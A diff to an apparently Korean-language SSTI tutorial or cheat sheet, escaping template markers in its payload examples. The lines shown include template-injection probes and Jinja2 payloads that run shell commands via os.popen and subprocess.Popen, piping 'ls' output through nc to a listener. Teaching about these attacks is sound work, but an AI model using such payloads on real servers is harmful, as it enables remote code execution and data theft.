@@ -37,7 +37,7 @@ SSTI 취약점의 경우 사용하는 템플릿에 따라 공격구문이 모두
 ```javascript
 {{7*7}}
 ${7*7}
-<%= 7*7 %>
+<\%= 7*7 \%>
 ${{7*7}}
 #{7*7}
 *{7*7}
@@ -237,8 +237,8 @@ http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,req
 ## {{}} Filtering → {% %}
 
 ```python
-{% if(config.__class__.__init__.__globals__['os'].popen('ls | nc 127.0.0.1 8080')) %}{% endif %}
-{% for i in range(0,500) %} {% if(((''.__class__.__mro__[1].__subclasses__()[i])|string) == "<class 'subprocess.Popen'>") %} {% if(''.__class__.__mro__[1].__subclasses__()[i]('ls | nc 127.0.0.1 8080', shell=True, stdout=-1)) %} {% endif %} {% endif %} {% endfor %}
+{\% if(config.__class__.__init__.__globals__['os'].popen('ls | nc 127.0.0.1 8080')) \%}{\% endif \%}
+{\% for i in range(0,500) \%} {\% if(((''.__class__.__mro__[1].__subclasses__()[i])|string) == "<class 'subprocess.Popen'>")\ \%} {% if(''.__class__.__mro__[1].__subclasses__()[i]('ls | nc 127.0.0.1 8080', shell=True, stdout=-1)) \%} \{% endif \%} {\% endif \%} {\% endfor \%}
 ```
 
 # SSTI for XSS
